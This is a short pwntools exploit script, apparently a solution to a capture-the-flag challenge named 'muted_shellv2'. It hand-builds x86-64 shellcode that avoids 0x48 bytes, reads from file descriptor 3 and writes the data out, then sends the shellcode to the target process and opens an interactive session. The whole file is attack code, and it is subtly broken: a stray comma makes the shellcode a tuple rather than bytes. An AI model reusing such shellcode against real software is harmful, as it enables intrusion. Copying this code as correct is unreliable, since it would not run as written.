#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# Manual shellcode to avoid 0x48 bytes
shellcode = (
    b"\x31\xc0"              # xor eax, eax
    b"\x6a\x03"              # push 3
    b"\x5f"                  # pop rdi
    b"\x54"                  # push rsp
    b"\x5e"                  # pop rsi
    b"\x6a\x01"              # push 1
    b"\x5a"                  # pop rdx
    b"\xff\xc2"*0xff,
    b"\x0f\x05"              # syscall
    b"\x89\xc2"              # mov edx, eax
    b"\x6a\x01"              # push 1
    b"\x5f"                  # pop rdi
    b"\x54"                  # push rsp
    b"\x5e"                  # pop rsi
    b"\x6a\x01"              # push 1
    b"\x58"                  # pop rax
    b"\x0f\x05"              # syscall
)

#print("Shellcode hex:", shellcode.hex())
#print("Contains 0x48:", b"\x48" in shellcode)
#print("Contains 0x00:", b"\x00" in shellcode)

p = process('./muted_shellv2')
p.sendafter(b":", shellcode)
p.interactive()
